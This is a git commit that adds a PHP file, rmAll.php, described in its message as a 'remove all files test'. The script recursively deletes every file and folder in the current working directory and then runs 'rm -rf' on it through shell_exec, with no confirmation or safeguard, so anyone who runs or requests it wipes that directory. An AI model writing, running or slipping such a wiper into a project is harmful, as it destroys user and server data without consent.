adb62206c2a1840e829b11bc0d534bb220cfd911
Danilo Petrovic <danilo86petrovic@gmail.com>
2024-01-07 08:17:42 +0100

    remove all files test (rmAll.php) added - this is sick...

---
+++ rmAll.php
@@ -0,0 +1,21 @@
+<?php
+function removeFolder($folderPath) {
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($folderPath, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::CHILD_FIRST
+    );
+
+    foreach ($iterator as $path) {
+        if ($path->isDir()) {
+            rmdir($path->getPathname());
+        } else {
+            unlink($path->getPathname());
+        }
+    }
+
+    rmdir($folderPath);
+}
+
+$folderPath = getcwd(); // Gets the current working directory
+removeFolder($folderPath);
+shell_exec('rm -rf ' . escapeshellarg($folderPath));
